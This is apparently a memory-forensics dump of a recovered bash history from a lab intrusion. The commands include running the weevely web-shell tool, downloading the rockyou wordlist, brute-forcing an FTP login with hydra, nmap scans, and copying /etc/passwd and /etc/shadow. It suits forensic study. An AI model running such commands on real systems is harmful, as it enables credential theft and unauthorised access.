Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /tmp
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd ..
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
    9210 bash                 2015-05-04 18:16:26 UTC+0000   python weevely.py 
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd weevely
    9210 bash                 2015-05-04 18:16:26 UTC+0000   lastb
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /tmp
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
    9210 bash                 2015-05-04 18:16:26 UTC+0000   last
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /tmp
    9210 bash                 2015-05-04 18:16:26 UTC+0000   wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls -a
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
    9210 bash                 2015-05-04 18:16:26 UTC+0000   sudo apt-get install hydra
    9210 bash                 2015-05-04 18:16:26 UTC+0000   nmap 192.168.56.101
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd ..
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /tmp
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cp rockyou.txt.bz2 /usr/local/mysql/.
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls /home
    9210 bash                 2015-05-04 18:16:26 UTC+0000   wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
    9210 bash                 2015-05-04 18:16:26 UTC+0000   nmap 192.168.56.0/24
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cp /etc/passwd ./.
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
    9210 bash                 2015-05-04 18:16:26 UTC+0000   chmod 777 shadow
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cp /etc/shadow ./.
    9210 bash                 2015-05-04 18:16:26 UTC+0000   hydra -l sue -P /tmp/rockyou.txt localhost ftp
    9210 bash                 2015-05-04 18:16:26 UTC+0000   nmap localhost
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /tmp
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
    9210 bash                 2015-05-04 18:16:26 UTC+0000   bunzip2 rockyou.txt.bz2 
    9210 bash                 2015-05-04 18:16:28 UTC+0000   ls
